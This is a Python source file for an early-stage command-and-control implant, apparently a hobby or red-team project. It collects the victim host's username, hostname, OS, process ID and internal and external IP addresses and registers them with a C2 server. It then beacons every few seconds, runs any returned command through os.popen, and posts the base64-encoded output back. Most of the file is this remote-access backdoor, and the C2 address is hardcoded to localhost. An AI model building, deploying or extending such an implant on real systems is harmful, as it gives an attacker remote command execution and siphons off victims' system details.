import requests
from sys import argv
import time
import itertools
import random
import string
import platform
import getpass
import os
import socket
import urllib.request
import argparse
import base64
from datetime import datetime  # Assuming you want to use datetime for timestamps

class Spy:
    def __init__(self):
        self.id = None
        self.guid = None
        self.active = False
        self.intaddr = None
        self.extaddr = None
        self.username = None
        self.hostname = None
        self.ops = None
        self.pid = None
        self.mission = None  # Initialize mission
        self.interval = None
        self.jitter = None
        self.firstcheckin = None
        self.lastcheckin = None
        self.output = None

    def initial_checkin(self, intaddr, extaddr, username, hostname, ops, pid):
        self.active = True
        self.intaddr = intaddr
        self.extaddr = extaddr
        self.username = username
        self.hostname = hostname
        self.ops = ops
        self.pid = pid
        data = {
            "active": str(self.active),
            "intaddr": str(self.intaddr),
            "extaddr": str(self.extaddr),
            "username": str(self.username),
            "hostname": str(self.hostname),
            "ops": str(self.ops),
            "pid": str(self.pid),
        }
        response = requests.post("http://localhost:5000/register", json=data)
        response_data=response.json()
        print(response_data)
        self.id=response_data.get('ID')
        self.guid=response_data.get('GUID')
        self.active=response_data.get('Active')
        self.firstcheckin=response_data.get('First Check-in')
        self.lastcheckin=response_data.get('Last Check-in')
        return response.text

#    def checkin(self):
#        self.lastcheckin = self.timestamp()
#        if self.mission is not None:
#            if self.mission == 'kill':
#                self.active = False
#
#    def timestamp(self):
#        return datetime.now()  # Or another appropriate implementation

def get_env(newspy):
	ops=platform.system()
	username=getpass.getuser()
	pid = os.getpid()	
	hostname=socket.gethostname()
	extaddr = urllib.request.urlopen('https://ident.me').read().decode('utf8')
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(('8.8.8.8', 1))  # connect() for UDP doesn't send packets
	intaddr = s.getsockname()[0]
	newspy.initial_checkin(intaddr, extaddr, username, hostname, ops, pid)
	print("[+] Connected to the C2 server")
	print("[+] Spy GUID "+str(newspy.guid))

def check_in(spy):
	data = {"id": spy.id, "active": spy.active}
	response = requests.post("http://localhost:5000/beacon", json=data)
	return response.json()  

def execute_command(command):
	result = os.popen(command).read()
	return result

#def upload():


if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument('--ip', '-i',required=True,dest='ip',help='Team server IP')
	parser.add_argument('--port', '-p',required=True,dest='port',help='Port of the listener')
#	parser.add_argument('--key', '-k',required=True,dest='key',help='Key to authenticate to the team server')
	parser.add_argument('--verbose', '-v',help='Print more data',action='store_true')	
	args = parser.parse_args()
#	key=args.key
	ip=args.ip
	port=args.port

	newspy=Spy()	
	get_env(newspy)

	while(True):
		check_in_response = check_in(newspy)
		command = check_in_response.get('command')
		if command:
			result = execute_command(command)
			result_bytes=result.encode("ascii")
			base64_bytes=base64.b64encode(result_bytes)
			output=base64_bytes.decode("ascii") 
			print(output)
			requests.post('http://localhost:5000/result/'+str(newspy.id),json={"command":command,"result": output})
		time.sleep(3)
	